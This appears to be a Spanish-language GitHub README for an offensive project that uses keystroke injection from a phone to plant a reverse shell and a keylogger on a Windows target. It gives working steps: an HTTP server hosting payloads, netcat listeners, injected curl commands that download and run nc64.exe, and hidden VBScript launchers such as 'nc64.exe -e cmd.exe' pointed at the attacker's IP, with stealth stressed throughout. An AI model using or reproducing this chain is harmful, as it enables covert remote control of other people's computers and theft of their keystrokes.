# InputStick-Project

  - Objetivo: Obtener ReverseShell y KeyLogger del sistema objetivo.

### Conseguir la ReverseShell haciendo el menos ruido posible.

La forma que utilizaremos para envíar los archivo ejecutables será creando un repositorio con Python3, donde compartiremos la carpeta donde se encuentran los archivos, donde se encontrarán los Scripts necesarios y el ejecutable de NetCat. Esté proyecto es realizado desde un sistema Linux.

- Comanda realizada: python3 -m http.server 8000

También dejaremos nuestro sistema escuchando por el puerto que indiquemos, nuestro caso 1234. Utilizaremos la herramienta "rlwrap" para poder ejecutar atajos de teclado en la ReverseShell.

- Comanda realizada: rlwrap nc -nlvp 1234 (por este puerto recibiremos la ReverseShell)

Una vez preparada nuestra maquina con que realizamos el proyecto, preparamos los archivos que se descargará en la maquina objetivo. En nuestro caso hemos creado un Script .vbs, dentro este Script indicamos la ejecución del ejecutable NetCat apuntando a la IP y puerto que hemos elegido. Con este Script hemos conseguido recibir la consexión ReverseShell en segundo plano, pudiendo cerrar la terminal del sistema objetivo, para ser lo menos visibles posible.

- Script i.vbs:
```vbscript
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "nc64.exe -e cmd.exe 0.0.0.0 1234", 0, False
```
Con todo esto, podemos continuar con la parte donde utilizamos nuestro telefono mobil con el que enviaremos las señales al sistema objetivo que nos interesa. Para esto usaremos una App.

- Ordenes envíadas:
```bash
Windows +r
cmd.exe
curl http://0.0.0.0:8000/nc64.exe -o nc64.exe
curl http://0.0.0.0:8000/i.vbs -o i.vbs
i.vbs
#Entre cada comanda se envía una señal de presionar la tecla Enter
```
Con todo esto ya recibiremos la conexión con su terminal.

### Conseguir el KeyLogger.

La forma que utilizaremos para hacer llegar los archivos al sistema objetivo será con procedimiento que con la ReverseShell, pero esta vez se descargar dos Scripts. El pimer Script será otro .vbs donde indicaremos que ejecute el Script con el contenido del KeyLogger. Como la carpeta ya la estamos compartiendo con python3, pasamos a la parte de escuchar de escuchar por el puerto que le indiquemos, en nuestro caso 4321.

- Comanda realizada: rlwrap nc -nlvp 4321 (por este puerto recibiremos la información del KeyLogger)

Ahora preparamos los Scrips que se descargará en el sistema objetivo, el primer archivo es ".vbs" y el segundo es ".py". (El único inconveniente que tiene este procedimiento es que los antivirus del sistema objetivo pueden detectar el Script con el KeyLogger y eliminarlo automaticamente)

- Script a.vbs:
```vbscript
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "keylogger.py", 0, False
```

- Script keylogger.py: [Ver Script](./scripts/keylogger.py)
- [Autor del Script](https://github.com/Maalfer)
